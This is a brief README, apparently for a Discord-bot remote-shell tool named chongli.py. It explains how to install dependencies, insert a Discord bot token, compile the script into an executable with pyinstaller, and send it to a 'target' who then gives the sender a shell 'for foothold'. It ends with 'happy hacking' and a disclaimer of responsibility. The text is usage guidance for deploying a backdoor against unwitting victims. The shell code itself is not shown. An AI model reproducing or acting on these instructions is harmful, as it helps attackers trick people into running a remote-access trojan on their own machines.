# usage

first you will need discord.py module which you can get by using pip

```
pip install discord.py
```

after that you will also need something to compile the code i recommend using pyinstalled 

```
pip install pyinstaller
```

now that you are all set go to discord developer portal create a bot and setup a server. 
copy the discord bot's token and put it in token variable and you are ready to compile the code

```
pyinstaller -F chongli.py
``` 

now just send the program to your target when they run it you get a very small but usable shell that can be used for foothold or anything else

happy hacking !(im not responsable for your actions btw)
